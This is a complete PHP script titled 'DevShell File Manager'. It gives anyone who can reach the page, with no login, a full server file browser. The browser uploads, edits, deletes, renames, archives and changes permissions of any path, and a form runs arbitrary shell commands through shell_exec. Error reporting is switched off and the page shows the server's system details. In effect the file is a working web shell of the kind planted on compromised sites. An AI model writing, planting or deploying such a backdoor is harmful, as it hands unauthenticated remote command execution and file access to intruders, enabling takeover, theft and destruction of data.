<?php
session_start();
error_reporting(0);
set_time_limit(0);

$cwd = isset($_GET['path']) ? $_GET['path'] : getcwd();
$cwd = realpath($cwd);
if ($cwd === false) {
    $cwd = getcwd();
}
chdir($cwd);

function perms($file) {
    $perms = fileperms($file);
    return substr(sprintf('%o', $perms), -4);
}

function formatSize($bytes) {
    if ($bytes >= 1073741824) return round($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return round($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return round($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}

function breadcrumb($path) {
    $parts = explode(DIRECTORY_SEPARATOR, $path);
    $crumbs = [];
    $build = '';
    foreach ($parts as $part) {
        if ($part === '') continue;
        $build .= DIRECTORY_SEPARATOR . $part;
        $crumbs[] = "<a href='?path=" . urlencode($build) . "'>" . htmlspecialchars($part) . "</a>";
    }
    return '/' . implode('/', $crumbs);
}


// ===== HANDLE UPLOAD =====
if (isset($_POST['upload'])) {
    if (isset($_FILES['file']) && $_FILES['file']['error'] === 0) {
        $uploadPath = $cwd . '/' . basename($_FILES['file']['name']);
        move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath);
    }
    header("Location: ?path=" . urlencode($cwd));
    exit;
}

// ===== HANDLE DELETE =====
if (isset($_GET['delete'])) {
    $target = $_GET['delete'];
    if (file_exists($target)) {
        if (is_dir($target)) {
            // Remove directory recursively
            function rrmdir($dir) {
                foreach(scandir($dir) as $file) {
                    if ($file === '.' || $file === '..') continue;
                    $path = "$dir/$file";
                    if (is_dir($path)) rrmdir($path);
                    else unlink($path);
                }
                rmdir($dir);
            }
            rrmdir($target);
        } else {
            unlink($target);
        }
    }
    header("Location: ?path=" . urlencode($cwd));
    exit;
}

// ===== HANDLE RENAME =====
if (isset($_POST['newname']) && isset($_POST['oldname'])) {
    $newName = $_POST['newname'];
    $oldName = $_POST['oldname'];
    if (file_exists($oldName) && !file_exists($newName)) {
        rename($oldName, $newName);
    }
    header("Location: ?path=" . urlencode($cwd));
    exit;
}

// ===== HANDLE FILE EDIT SAVE =====
if (isset($_POST['editfile']) && isset($_POST['content'])) {
    $editFile = $_POST['editfile'];
    if (file_exists($editFile) && is_file($editFile) && is_writable($editFile)) {
        file_put_contents($editFile, $_POST['content']);
    }
    header("Location: ?path=" . urlencode(dirname($editFile)));
    exit;
}

// ===== HANDLE CREATE NEW FILE/FOLDER =====
if (isset($_POST['create'])) {
    $name = $_POST['name'];
    $type = $_POST['type'];
    if ($name !== '') {
        $fullpath = $cwd . '/' . $name;
        if ($type === 'file' && !file_exists($fullpath)) {
            touch($fullpath);
        } elseif ($type === 'dir' && !file_exists($fullpath)) {
            mkdir($fullpath);
        }
    }
    header("Location: ?path=" . urlencode($cwd));
    exit;
}

// ===== HANDLE ZIP CREATION =====
if (isset($_GET['zip'])) {
    $zip = new ZipArchive();
    $target = $_GET['zip'];
    $zname = $cwd . '/' . basename($target) . '.zip';
    if ($zip->open($zname, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
        if (is_dir($target)) {
            $files = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($target, FilesystemIterator::SKIP_DOTS),
                RecursiveIteratorIterator::LEAVES_ONLY
            );
            foreach ($files as $file) {
                $filePath = $file->getRealPath();
                $zipPath = substr($filePath, strlen($target) + 1);
                $zip->addFile($filePath, $zipPath);
            }
        } else {
            $zip->addFile($target, basename($target));
        }
        $zip->close();
    }
    header("Location: ?path=" . urlencode($cwd));
    exit;
}

// ===== HANDLE UNZIP (zip & tar.gz) =====
if (isset($_GET['unzip'])) {
    $fileToUnzip = $_GET['unzip'];
    $ext = strtolower(pathinfo($fileToUnzip, PATHINFO_EXTENSION));
    
    // Get directory path where the archive is located
    $extractToDir = dirname($fileToUnzip);
    
    if ($ext === 'zip') {
        $zip = new ZipArchive();
        if ($zip->open($fileToUnzip) === true) {
            // Extract to the directory where the zip file is
            $zip->extractTo($extractToDir);
            $zip->close();
        }
    } elseif ($ext === 'gz' && preg_match('/\.tar\.gz$/i', $fileToUnzip)) {
        $cmd = "tar -xzf " . escapeshellarg($fileToUnzip) . " -C " . escapeshellarg($extractToDir);
        exec($cmd);
    }
    
    // Redirect to the folder where we extracted
    header("Location: ?path=" . urlencode($extractToDir));
    exit;
}


// ===== HANDLE SHELL COMMAND EXECUTION =====
$output = null;
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    if ($cmd !== '') {
        $output = shell_exec($cmd . " 2>&1");
    }
}

// ===== HANDLE FILE DOWNLOAD =====
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file) && is_file($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// ===== CLIPBOARD COPY/CUT =====
if (isset($_GET['action']) && in_array($_GET['action'], ['copy', 'cut']) && isset($_GET['target'])) {
    $target = $_GET['target'];
    if (file_exists($target)) {
        $_SESSION['clipboard'] = [
            'type' => $_GET['action'],
            'path' => $target,
        ];
    }
    header("Location: ?path=" . urlencode($cwd));
    exit;
}

// ===== CLIPBOARD PASTE =====
if (isset($_GET['paste']) && isset($_SESSION['clipboard'])) {
    $src = $_SESSION['clipboard']['path'];

    // The target directory to paste into, fallback to current directory ($cwd)
    // You can specify a directory via GET param 'destdir' (optional)
    $targetDir = isset($_GET['destdir']) ? $_GET['destdir'] : $cwd;

    // Make sure targetDir exists and is a directory
    if (!is_dir($targetDir)) {
        // Optional: you can throw error or fallback to $cwd
        $targetDir = $cwd;
    }

    $dst = $targetDir . '/' . basename($src);

    // Instead of creating _copyN, if file/dir exists, we replace it
    if (file_exists($dst)) {
        // If it's a directory, delete recursively before copying
        if (is_dir($dst)) {
            function rrmdir($dir) {
                foreach(scandir($dir) as $file) {
                    if ($file === '.' || $file === '..') continue;
                    $path = "$dir/$file";
                    if (is_dir($path)) rrmdir($path);
                    else unlink($path);
                }
                rmdir($dir);
            }
            rrmdir($dst);
        } else {
            unlink($dst);
        }
    }

    if ($_SESSION['clipboard']['type'] === 'copy') {
        if (is_dir($src)) {
            function copy_dir($src, $dst) {
                mkdir($dst);
                foreach (scandir($src) as $f) {
                    if ($f === '.' || $f === '..') continue;
                    $srcPath = "$src/$f";
                    $dstPath = "$dst/$f";
                    if (is_dir($srcPath)) copy_dir($srcPath, $dstPath);
                    else copy($srcPath, $dstPath);
                }
            }
            copy_dir($src, $dst);
        } else {
            copy($src, $dst);
        }
    } elseif ($_SESSION['clipboard']['type'] === 'cut') {
        rename($src, $dst);
    }

    unset($_SESSION['clipboard']);
    header("Location: ?path=" . urlencode($targetDir));
    exit;
}



// ===== HANDLE EDIT FILE LOAD =====
$editFileContent = null;
$editFileName = null;
if (isset($_GET['edit'])) {
    $f = $_GET['edit'];
    if (file_exists($f) && is_file($f)) {
        $editFileContent = file_get_contents($f);
        $editFileName = $f;
    }
}

// ===== HANDLE CHANGE PERMISSIONS =====
if (isset($_POST['chmod']) && isset($_POST['chmod_target']) && isset($_POST['chmod_perm'])) {
    $target = $_POST['chmod_target'];
    $perm = $_POST['chmod_perm'];
    if (file_exists($target) && preg_match('/^[0-7]{3,4}$/', $perm)) {
        chmod($target, octdec($perm));
    }
    header("Location: ?path=" . urlencode($cwd));
    exit;
}

?><!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>DevShell File Manager</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet" />
  <style>
    body {
      background-color: #121212;
      color: #eee;
      padding: 2rem;
    }
    a { color: #00bfff; text-decoration: none; }
    a:hover { text-decoration: underline; }
    .table-dark th, .table-dark td { color: #ddd; }
    input, select, textarea, button { border-radius: 4px !important; }
    textarea { font-family: monospace; background-color: #1e1e1e; color: #eee; border: 1px solid #333; }
    .form-control, .form-select { background-color: #1e1e1e; color: #eee; border: 1px solid #444; }
    .breadcrumb a { color: #0dcaf0; }
    .btn-sm { font-size: 0.75rem; }
    .dropdown-menu-dark { background-color: #222; }
    .dropdown-menu-dark a { color: #ddd; }
    .dropdown-menu-dark a:hover { background-color: #333; color: #0dcaf0; }
  </style>
</head>
<body>
  <div style="background:#222;color:#0f0;padding:8px;font-family:monospace;font-size:14px;">
    Server Description: <?php echo php_uname(); ?>
  </div>

  <div class="container">
    <h1>DevShell File Manager</h1>

    <nav aria-label="breadcrumb">
      <ol class="breadcrumb bg-dark p-2 rounded">
        <li class="breadcrumb-item"><a href="?path=/">/</a></li>
        <?php
        $parts = explode(DIRECTORY_SEPARATOR, trim($cwd, DIRECTORY_SEPARATOR));
        $pathBuild = '';
        foreach ($parts as $part) {
            if ($part === '') continue;
            $pathBuild .= DIRECTORY_SEPARATOR . $part;
            echo '<li class="breadcrumb-item"><a href="?path=' . urlencode($pathBuild) . '">' . htmlspecialchars($part) . '</a></li>';
        }
        ?>
      </ol>
    </nav>

<?php if ($editFileContent !== null): ?>
  <!-- EDIT FILE -->
  <h2>Editing: <?=htmlspecialchars($editFileName)?></h2>
  <form method="post" action="?path=<?=urlencode(dirname($editFileName))?>">
    <input type="hidden" name="editfile" value="<?=htmlspecialchars($editFileName)?>" />
    <div class="mb-3">
      <textarea name="content" rows="20" class="form-control"><?=htmlspecialchars($editFileContent)?></textarea>
    </div>
    <button type="submit" class="btn btn-success">Save</button>
    <a href="?path=<?=urlencode(dirname($editFileName))?>" class="btn btn-secondary">Cancel</a>
  </form>
<?php else: ?>

  <!-- UPLOAD FORM -->
  <form method="post" enctype="multipart/form-data" class="mb-3">
    <label class="form-label">Upload File:</label>
    <input type="file" name="file" required class="form-control mb-2" />
    <button type="submit" name="upload" class="btn btn-primary">Upload</button>
  </form>

  <!-- CREATE FILE/FOLDER FORM -->
  <form method="post" class="mb-3 row g-2 align-items-center">
    <div class="col-auto">
      <input type="text" name="name" placeholder="New file or folder name" required class="form-control" />
    </div>
    <div class="col-auto">
      <select name="type" class="form-select">
        <option value="file">File</option>
        <option value="dir">Folder</option>
      </select>
    </div>
    <div class="col-auto">
      <button type="submit" name="create" class="btn btn-success">Create</button>
    </div>
  </form>

  <!-- FILE/FOLDER TABLE -->
  <table class="table table-dark table-striped align-middle">
    <thead>
      <tr>
        <th>Name</th>
        <th>Size</th>
        <th>Permissions</th>
        <th>Last Modified</th>
        <th>Actions</th>
      </tr>
    </thead>
    <tbody>
    <?php
      $items = scandir($cwd);
      foreach ($items as $item) {
          if ($item === '.') continue;
          if ($item === '..') {
              $up = dirname($cwd);
              echo '<tr>';
              echo '<td><a href="?path=' . urlencode($up) . '">.. (Parent Directory)</a></td>';
              echo '<td>-</td><td>-</td><td>-</td><td>-</td>';
              echo '</tr>';
              continue;
          }
          $fullpath = $cwd . DIRECTORY_SEPARATOR . $item;
          $isDir = is_dir($fullpath);
          $size = $isDir ? '-' : formatSize(filesize($fullpath));
          $perm = perms($fullpath);
          $mod = date('Y-m-d H:i:s', filemtime($fullpath));
          echo '<tr>';
          echo '<td>';
          if ($isDir) {
              echo "📁 <a href='?path=" . urlencode($fullpath) . "'>" . htmlspecialchars($item) . "</a>";
          } else {
              echo "📄 " . htmlspecialchars($item);
          }
          echo '</td>';
          echo "<td>$size</td>";
          echo "<td>$perm</td>";
          echo "<td>$mod</td>";
          echo '<td>';
          // Download only if file
          if (!$isDir) {
              echo '<a href="?download=' . urlencode($fullpath) . '" class="btn btn-sm btn-outline-primary me-1">Download</a>';
          }
          // Zip folder or file
          echo '<a href="?zip=' . urlencode($fullpath) . '" class="btn btn-sm btn-outline-secondary me-1">Zip</a>';
          // Unzip only if .zip or .tar.gz
          if (!$isDir) {
              $ext = strtolower(pathinfo($fullpath, PATHINFO_EXTENSION));
              if ($ext === 'zip' || preg_match('/\.tar\.gz$/i', $fullpath)) {
                  echo '<a href="?unzip=' . urlencode($fullpath) . '" class="btn btn-sm btn-outline-warning me-1">Unzip</a>';
              }
          }
          // Clipboard copy/cut
          echo '<a href="?action=copy&target=' . urlencode($fullpath) . '" class="btn btn-sm btn-outline-info me-1">Copy</a>';
          echo '<a href="?action=cut&target=' . urlencode($fullpath) . '" class="btn btn-sm btn-outline-danger me-1">Cut</a>';

          // Dropdown "More" for Edit, Rename, Delete, Chmod
          echo '<div class="btn-group">';
          echo '<button class="btn btn-sm btn-outline-light dropdown-toggle" data-bs-toggle="dropdown" aria-expanded="false">More</button>';
          echo '<ul class="dropdown-menu dropdown-menu-dark">';
          // Edit for files only
          if (!$isDir) {
              echo '<li><a class="dropdown-item" href="?edit=' . urlencode($fullpath) . '">Edit</a></li>';
          }
          // Rename (opens a prompt in JS)
          echo '<li><a href="#" class="dropdown-item rename-link" data-file="' . htmlspecialchars($fullpath) . '">Rename</a></li>';
          // Change permissions
          echo '<li><a href="#" class="dropdown-item chmod-link" data-file="' . htmlspecialchars($fullpath) . '" data-perm="' . $perm . '">Change Permissions</a></li>';
          // Delete
          echo '<li><a class="dropdown-item text-danger" href="?delete=' . urlencode($fullpath) . '" onclick="return confirm(\'Are you sure to delete this item?\');">Delete</a></li>';
          echo '</ul></div>';

          echo '</td>';
          echo '</tr>';
      }
    ?>
    </tbody>
  </table>

  <!-- Clipboard Paste button if clipboard has data -->
  <?php if (isset($_SESSION['clipboard'])): ?>
    <form method="get" class="mb-3">
      <input type="hidden" name="paste" value="1" />
      <button type="submit" class="btn btn-info">Paste clipboard content here</button>
    </form>
  <?php endif; ?>

  <!-- SHELL COMMAND EXECUTION -->
  <form method="post" class="mb-3">
    <label class="form-label">Execute Shell Command:</label>
    <input type="text" name="cmd" class="form-control mb-2" placeholder="Enter shell command" />
    <button type="submit" class="btn btn-danger">Execute</button>
  </form>
  <?php if ($output !== null): ?>
    <pre style="background:#222; padding:1rem; color:#0f0; border-radius:5px;"><?=htmlspecialchars($output)?></pre>
  <?php endif; ?>

  <!-- RENAME MODAL -->
  <div class="modal fade" id="renameModal" tabindex="-1" aria-labelledby="renameModalLabel" aria-hidden="true">
    <div class="modal-dialog">
      <form method="post" class="modal-content">
        <div class="modal-header">
          <h5 class="modal-title" id="renameModalLabel">Rename File/Folder</h5>
          <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
        </div>
        <div class="modal-body">
          <input type="hidden" name="oldname" id="renameOldName" />
          <input type="text" name="newname" id="renameNewName" class="form-control" required />
        </div>
        <div class="modal-footer">
          <button type="submit" class="btn btn-primary">Rename</button>
          <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
        </div>
      </form>
    </div>
  </div>

  <!-- CHMOD MODAL -->
  <div class="modal fade" id="chmodModal" tabindex="-1" aria-labelledby="chmodModalLabel" aria-hidden="true">
    <div class="modal-dialog">
      <form method="post" class="modal-content">
        <div class="modal-header">
          <h5 class="modal-title" id="chmodModalLabel">Change Permissions</h5>
          <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal" aria-label="Close"></button>
        </div>
        <div class="modal-body">
          <input type="hidden" name="chmod_target" id="chmodTarget" />
          <label for="chmodPerm" class="form-label">Permissions (octal):</label>
          <input type="text" name="chmod_perm" id="chmodPerm" pattern="[0-7]{3,4}" title="Enter octal permissions like 0755 or 644" required class="form-control" />
        </div>
        <div class="modal-footer">
          <button type="submit" class="btn btn-warning">Change</button>
          <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
        </div>
      </form>
    </div>
  </div>

<?php endif; ?>

  </div>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
  <script>
    document.querySelectorAll('.rename-link').forEach(el => {
      el.addEventListener('click', e => {
        e.preventDefault();
        const file = e.target.dataset.file;
        document.getElementById('renameOldName').value = file;
        document.getElementById('renameNewName').value = file.split('/').pop();
        const renameModal = new bootstrap.Modal(document.getElementById('renameModal'));
        renameModal.show();
      });
    });

    document.querySelectorAll('.chmod-link').forEach(el => {
      el.addEventListener('click', e => {
        e.preventDefault();
        const file = e.target.dataset.file;
        const perm = e.target.dataset.perm;
        document.getElementById('chmodTarget').value = file;
        document.getElementById('chmodPerm').value = perm;
        const chmodModal = new bootstrap.Modal(document.getElementById('chmodModal'));
        chmodModal.show();
      });
    });
  </script>
</body>
</html>
